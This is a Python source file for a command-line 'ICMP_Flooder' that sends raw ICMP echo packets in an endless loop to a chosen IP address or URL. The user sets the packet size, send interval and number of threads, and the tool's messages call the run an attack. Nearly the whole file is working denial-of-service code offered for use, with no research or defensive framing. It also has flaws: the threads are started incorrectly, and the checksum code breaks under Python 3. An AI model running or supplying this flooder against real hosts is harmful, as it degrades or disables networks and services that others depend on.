import sys
import time
import string
import struct
import socket
import argparse
from threading import Thread, Event

class Flooder:
    # Check data, calculated from the ICMP header and data
    def checksum(self, msg):
        sum = 0
        for i in range(0, len(msg), 2):
            w = ord(msg[i]) + (ord(msg[i+1]) << 8)
            sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
        return socket.htons(~sum & 0xffff)

    # Construct the header and data of packet and pack it
    def construct_packet(self, length):
        header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
        data = (length - 50) * 'Q'
        data = struct.pack("d", time.time()) + data.encode('ascii')
        header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
        return header + data

    # Create socket to send packets to specified ip address
    #  and close the created socket after using
    def create_socket(self, ip, port, length, freq):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        socket.inet_aton(ip)

        while(True):
            packet = self.construct_packet(length)
            sock.sendto(packet, (ip, port))
            time.sleep(freq)
        
        sock.close()
        
    def main(self, argv):
        parser = argparse.ArgumentParser(prog="ICMP_Flooder", description="ICMP-packets flooder." +
                " This programm creates and sends the ICMP-packets to target IP-address/URL" +
                " address. You can change port number, length of packet and frequence of sending.\n",
                epilog='Contact with me on "https://github.com/breadrock1" \n\n')
        parser.add_argument('-i', help='Enter target ip address of destination', metavar='', type=str.format)
        parser.add_argument('-u', help='Enter target url address', metavar='', type=str)
        parser.add_argument('-p', help='Specify port number', metavar='', default=69, type=int)
        parser.add_argument('-l', help='Specify packet length', metavar='', default=60, type =int)
        parser.add_argument('-f', help='Specify value of frequence to send packet', metavar='', default=0.01, type=float)
        parser.add_argument('-t', help='Count thread', metavar='', default=1, type=int)
        args = parser.parse_args()

        # Try to get ip address of destination (by url too)
        if args.u:
            url = args.u
            ip_addr = socket.gethostbyname(url)
            print("Specific Url: ", url)
        if args.i:
            ip_addr = args.i
            print("Specific IP-Address: ", ip_addr)
        
        # Check for correct port number to send packet      
        if int(args.p) > 0 and int(args.p) < 65530:
            print("Specific port: ", int(args.p))
        elif int(args.p) == 69:
            print("Default port: ", int(args.p))
        else:
            print("No valid port number")
            sys.exit()
            
        # Check for correct value of lenhgth of packet
        if int(args.l) < 51:
            print("Is too few length")
            sys.exit()
        elif int(args.l) == 60:
            print("Default length: ", int(args.l))
        else:
            print("Specific length of packet: ", int(args.l))

        # Check for correct value of frequency to send packets
        if float(args.f) == 0.1:
            print("Default times: ", float(args.f))
        else:
            print("Specific count: ", float(args.f))

        try:
            evnt = Event()
            threads = []
            for i in range(args.t):
                thrd = Thread(target=self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f)))
                thrd.daemon = True
                thrd.start()
                threads.append(thrd)
        except KeyboardInterrupt:
            evnt.set()
            print('\t Stop open threads ...\n')
            for thrd in threads:
                thrd._stop()
            print('\t Attack has been stopped!\n')

if __name__ == "__main__":
    flood = Flooder()
    flood.main(sys.argv[1:])
